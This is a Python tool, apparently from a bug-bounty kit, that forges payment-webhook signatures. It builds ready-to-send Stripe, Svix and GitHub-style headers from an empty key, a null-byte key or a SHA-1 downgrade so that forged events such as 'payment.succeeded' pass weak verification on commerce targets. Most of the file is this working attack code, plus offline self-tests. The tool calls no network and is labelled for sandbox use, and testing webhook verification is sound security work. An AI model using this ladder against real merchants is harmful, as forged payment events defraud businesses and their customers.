#!/usr/bin/env python3
"""
commerce_webhook.py - payment webhook / IPN HMAC forge ladder.

WHY: webhook/IPN signature verification is the most-skipped gate on commerce targets
(the "forged authoritative event" kill in bizlogic-hunter). The highest-probability win
is the empty-secret rung: HMAC(key='', body) is deterministic and publicly computable
by anyone who can read the signature algorithm from the source or docs. This file makes
the forge trivial and systematic.

FUNCTIONS

  stripe_sig(secret, body, ts=None)
      Compute a Stripe-style webhook signature header:
      "t=<ts>,v1=<HMAC-SHA256(secret, '<ts>.<body_str>')>"
      Used by Stripe, and cloned by many in-house implementations.

  svix_sig(secret, id, ts, body)
      Compute a Svix (and Clerk/Resend/many SaaS) signature header:
      "v1,<base64(HMAC-SHA256(secret, '<id>.<ts>.<body_str>'))>"

  github_sig(secret, body)
  hub_sig(secret, body)
      Compute a GitHub/hub-style signature: "sha256=<HMAC-SHA256(secret, body)>"
      Also used by Shopify, WooCommerce, and most webhook-as-a-service providers.

  forge_ladder(body, secret=None)
      Return a list of (label, header_value) pairs for the full forge runbook.
      Rungs (in priority order):
        1. "empty-secret"     HMAC(key=b'', body) - deterministic, publicly computable win
        2. "null-byte-secret" HMAC(key=b'\\x00', body)
        3. "sha1-downgrade"   SHA1 variant (some providers accept sha1= alongside sha256=)
        4. "known-secret"     HMAC(key=secret, body) if secret is provided (the real sig)
      Each rung is a fully-formed header value ready to drop into the webhook request.
      empty-secret FIRST: the win costs zero knowledge of the real secret.

  forge_ladder_all(body, secret=None)
      Same as forge_ladder but returns all three algorithm families
      (Stripe, Svix, GitHub) so you can try every format in one pass.

SECURITY: pure stdlib, offline, no network. Sandbox/test bodies only.

CLI:
  commerce_webhook.py selfcheck    run offline known-answer + structural tests
"""
import hashlib
import hmac
import base64
import sys
import time


# ---------------------------------------------------------------------------
# 1. Stripe-style webhook signature
# ---------------------------------------------------------------------------

def stripe_sig(secret: "str | bytes", body: "str | bytes", ts: "int | None" = None) -> str:
    """Compute a Stripe-style webhook signature header.

    Format: "t=<ts>,v1=<HMAC-SHA256(secret, '<ts>.<body>')>"

    Parameters
    ----------
    secret  The webhook signing secret (bytes or str; str is UTF-8 encoded).
    body    The raw request body (bytes or str).
    ts      Unix timestamp int (default: current time). Use a fixed value in tests.

    Returns
    -------
    String value of the `Stripe-Signature` header.
    """
    if ts is None:
        ts = int(time.time())
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    if isinstance(body, str):
        body = body.encode("utf-8")
    signed_payload = f"{ts}.".encode() + body
    sig = hmac.new(secret, signed_payload, hashlib.sha256).hexdigest()
    return f"t={ts},v1={sig}"


# ---------------------------------------------------------------------------
# 2. Svix-style webhook signature
# ---------------------------------------------------------------------------

def svix_sig(secret: "str | bytes", msg_id: str, ts: "int | None",
             body: "str | bytes") -> str:
    """Compute a Svix (Clerk, Resend, many SaaS) webhook signature header.

    Format: "v1,<base64(HMAC-SHA256(secret, '<msg_id>.<ts>.<body>'))>"

    The Svix secret is typically base64-encoded on the dashboard; pass it raw
    (decoded) here. If you have the base64 form, decode it first:
        import base64; secret = base64.b64decode(dashboard_secret)

    Parameters
    ----------
    secret  Raw (not base64-encoded) signing secret bytes or str.
    msg_id  The `svix-id` / `webhook-id` header value.
    ts      Unix timestamp int (or None for current time).
    body    Raw request body bytes or str.

    Returns
    -------
    String value of the `svix-signature` / `webhook-signature` header.
    """
    if ts is None:
        ts = int(time.time())
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    if isinstance(body, str):
        body = body.encode("utf-8")
    signed_payload = f"{msg_id}.{ts}.".encode() + body
    raw_sig = hmac.new(secret, signed_payload, hashlib.sha256).digest()
    return "v1," + base64.b64encode(raw_sig).decode()


# ---------------------------------------------------------------------------
# 3. GitHub / hub-style signature (sha256=)
# ---------------------------------------------------------------------------

def github_sig(secret: "str | bytes", body: "str | bytes") -> str:
    """Compute a GitHub-style webhook signature.

    Format: "sha256=<HMAC-SHA256(secret, body)>"
    Also used by Shopify (X-Shopify-Hmac-Sha256 is the bare hex without prefix),
    WooCommerce (X-WC-Webhook-Signature is base64), and most webhook-as-a-service
    providers. Shopify uses base64(HMAC-SHA256(secret, body)) without the "sha256="
    prefix; adjust at the call site.

    Returns
    -------
    String "sha256=<hexdigest>" (GitHub / most providers).
    """
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    if isinstance(body, str):
        body = body.encode("utf-8")
    sig = hmac.new(secret, body, hashlib.sha256).hexdigest()
    return f"sha256={sig}"


# Alias used by some older providers
hub_sig = github_sig


# ---------------------------------------------------------------------------
# 4. SHA-1 downgrade variant
# ---------------------------------------------------------------------------

def _sha1_sig(secret: "str | bytes", body: "str | bytes") -> str:
    """SHA-1 downgrade rung: "sha1=<HMAC-SHA1(secret, body)>".
    Some providers accept sha1= signatures alongside sha256= (downgrade attack)."""
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    if isinstance(body, str):
        body = body.encode("utf-8")
    sig = hmac.new(secret, body, hashlib.sha1).hexdigest()
    return f"sha1={sig}"


# ---------------------------------------------------------------------------
# 5. forge_ladder
# ---------------------------------------------------------------------------

def forge_ladder(body: "str | bytes", secret: "str | bytes | None" = None,
                 ts: "int | None" = None, msg_id: str = "msg_test_001") -> list:
    """Return the GitHub/hub-format forge runbook for body.

    Each entry: (label, header_value) where header_value is the computed
    `X-Hub-Signature-256` (or equivalent) string, ready to send.

    Rungs in priority order:
      1. "empty-secret"     HMAC(key=b'', body) - the deterministic public win.
      2. "null-byte-secret" HMAC(key=b'\\x00', body)
      3. "sha1-downgrade"   SHA-1 variant of the same body.
      4. "known-secret"     Real signature if `secret` is provided (baseline/ground truth).

    Parameters
    ----------
    body    Raw webhook body (str or bytes).
    secret  Optional real secret for the known-secret rung.
    ts      Timestamp (unused in hub-format; kept for API symmetry).
    msg_id  Unused in hub-format; kept for API symmetry.
    """
    if isinstance(body, str):
        body = body.encode("utf-8")
    ladder = [
        ("empty-secret",     github_sig(b"", body)),
        ("null-byte-secret", github_sig(b"\x00", body)),
        ("sha1-downgrade",   _sha1_sig(b"", body)),
    ]
    if secret is not None:
        if isinstance(secret, str):
            secret = secret.encode("utf-8")
        ladder.append(("known-secret", github_sig(secret, body)))
    return ladder


def forge_ladder_all(body: "str | bytes", secret: "str | bytes | None" = None,
                     ts: "int | None" = None,
                     msg_id: str = "msg_test_001") -> list:
    """Return the full forge runbook across all three algorithm families.

    Returns a flat list of (label, header_name, header_value) triples covering
    Stripe-style, Svix-style, and GitHub-style formats so a single loop can
    try every format against the target webhook endpoint.

    Each entry: (label, header_name, header_value)
    """
    if ts is None:
        ts = int(time.time())
    if isinstance(body, str):
        body = body.encode("utf-8")

    rows = []
    for label, hdr_val in forge_ladder(body, secret=secret, ts=ts, msg_id=msg_id):
        rows.append((label, "X-Hub-Signature-256", hdr_val))

    # Stripe family
    stripe_hdr = stripe_sig(b"", body, ts=ts)
    rows.append(("stripe-empty-secret", "Stripe-Signature", stripe_hdr))
    if secret:
        rows.append(("stripe-known-secret", "Stripe-Signature",
                     stripe_sig(secret, body, ts=ts)))

    # Svix family
    svix_hdr = svix_sig(b"", msg_id=msg_id, ts=ts, body=body)
    rows.append(("svix-empty-secret", "svix-signature", svix_hdr))
    if secret:
        rows.append(("svix-known-secret", "svix-signature",
                     svix_sig(secret, msg_id=msg_id, ts=ts, body=body)))

    return rows


# ---------------------------------------------------------------------------
# SELFCHECK
# ---------------------------------------------------------------------------

def _selfcheck():
    BODY = b'{"event":"payment.succeeded","amount":100}'
    SECRET = b"real-webhook-secret"
    TS = 1700000000

    # ------------------------------------------------------------------
    # 1. stripe_sig known-answer
    # ------------------------------------------------------------------
    # HMAC-SHA256("real-webhook-secret", "1700000000.<body>")
    expected_stripe_payload = f"{TS}.".encode() + BODY
    expected_stripe_hex = hmac.new(SECRET, expected_stripe_payload, hashlib.sha256).hexdigest()
    got = stripe_sig(SECRET, BODY, ts=TS)
    assert got == f"t={TS},v1={expected_stripe_hex}", f"stripe_sig mismatch: {got}"

    # ------------------------------------------------------------------
    # 2. svix_sig known-answer
    # ------------------------------------------------------------------
    MSG_ID = "msg_test_abc"
    svix_payload = f"{MSG_ID}.{TS}.".encode() + BODY
    expected_svix_raw = hmac.new(SECRET, svix_payload, hashlib.sha256).digest()
    expected_svix = "v1," + base64.b64encode(expected_svix_raw).decode()
    got2 = svix_sig(SECRET, msg_id=MSG_ID, ts=TS, body=BODY)
    assert got2 == expected_svix, f"svix_sig mismatch: {got2}"

    # ------------------------------------------------------------------
    # 3. github_sig known-answer
    # ------------------------------------------------------------------
    expected_gh_hex = hmac.new(SECRET, BODY, hashlib.sha256).hexdigest()
    got3 = github_sig(SECRET, BODY)
    assert got3 == f"sha256={expected_gh_hex}", f"github_sig mismatch: {got3}"
    assert hub_sig is github_sig, "hub_sig must alias github_sig"

    # ------------------------------------------------------------------
    # 4. forge_ladder structure: empty-secret FIRST, all 4 rungs when secret given
    # ------------------------------------------------------------------
    ladder = forge_ladder(BODY, secret=SECRET, ts=TS)
    assert ladder[0][0] == "empty-secret", \
        f"empty-secret must be first rung, got: {ladder[0][0]}"
    labels = [r[0] for r in ladder]
    assert "empty-secret" in labels
    assert "null-byte-secret" in labels
    assert "sha1-downgrade" in labels
    assert "known-secret" in labels
    assert len(ladder) == 4, f"expected 4 rungs with secret, got {len(ladder)}"

    # ------------------------------------------------------------------
    # 5. forge_ladder without secret: 3 rungs only
    # ------------------------------------------------------------------
    ladder2 = forge_ladder(BODY)
    assert len(ladder2) == 3, f"expected 3 rungs without secret, got {len(ladder2)}"
    assert ladder2[0][0] == "empty-secret"
    assert "known-secret" not in [r[0] for r in ladder2]

    # ------------------------------------------------------------------
    # 6. forge_ladder_all contains all three families
    # ------------------------------------------------------------------
    all_rows = forge_ladder_all(BODY, secret=SECRET, ts=TS)
    all_labels = [r[0] for r in all_rows]
    assert "empty-secret" in all_labels
    assert "stripe-empty-secret" in all_labels
    assert "svix-empty-secret" in all_labels
    assert "stripe-known-secret" in all_labels
    assert "svix-known-secret" in all_labels

    # ------------------------------------------------------------------
    # 7. Stability: same inputs -> same outputs (deterministic with fixed ts)
    # ------------------------------------------------------------------
    assert stripe_sig(SECRET, BODY, ts=TS) == stripe_sig(SECRET, BODY, ts=TS)
    assert github_sig(SECRET, BODY) == github_sig(SECRET, BODY)
    assert svix_sig(SECRET, msg_id=MSG_ID, ts=TS, body=BODY) == \
           svix_sig(SECRET, msg_id=MSG_ID, ts=TS, body=BODY)

    # ------------------------------------------------------------------
    # 8. str inputs work the same as bytes
    # ------------------------------------------------------------------
    body_str = BODY.decode()
    assert github_sig(SECRET.decode(), body_str) == github_sig(SECRET, BODY)
    assert stripe_sig(SECRET.decode(), body_str, ts=TS) == stripe_sig(SECRET, BODY, ts=TS)

    print("SELFCHECK OK  stripe/svix/github sigs stable+correct, empty-secret rung first, forge_ladder_all covers all 3 families")


def main(argv):
    if argv and argv[0] == "selfcheck":
        return _selfcheck()
    print(__doc__)


if __name__ == "__main__":
    main(sys.argv[1:])
